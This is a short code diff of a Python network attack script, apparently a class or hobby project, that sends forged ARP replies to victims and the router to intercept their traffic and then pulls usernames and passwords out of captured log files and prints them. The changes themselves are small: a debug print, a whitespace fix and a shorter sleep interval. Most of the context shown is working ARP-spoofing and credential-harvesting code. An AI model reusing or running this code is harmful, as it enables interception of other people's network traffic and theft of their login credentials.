@@ -86,6 +86,7 @@ if __name__ == "__main__":
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
+                print(ip.split(".")[3])
                 victimpacket = ARP( op      =  2,
                                     pdst    = ip[j],            # victim's IP
                                     hwdst   = mac[j],           # victim's MAC 
@@ -104,7 +105,7 @@ if __name__ == "__main__":
                 send(routerpacket, verbose=0)
                 if(sending_flag):
                     print("Send to: ",ip[j]," ",mac[j])
-                        
+
             # get all username and password in log file
             print(" ")
             for file in os.listdir("logdir/"):
@@ -115,6 +116,6 @@ if __name__ == "__main__":
                             b = [m.start() for m in re.finditer("=", line)]
                             print("username= %s  password= %s" % (line[b[0]+1:a[0]], line[b[1]+1:a[1]]))
             sending_flag = False
-            sleep(2)
+            sleep(1)
     finally:
         print("Done")
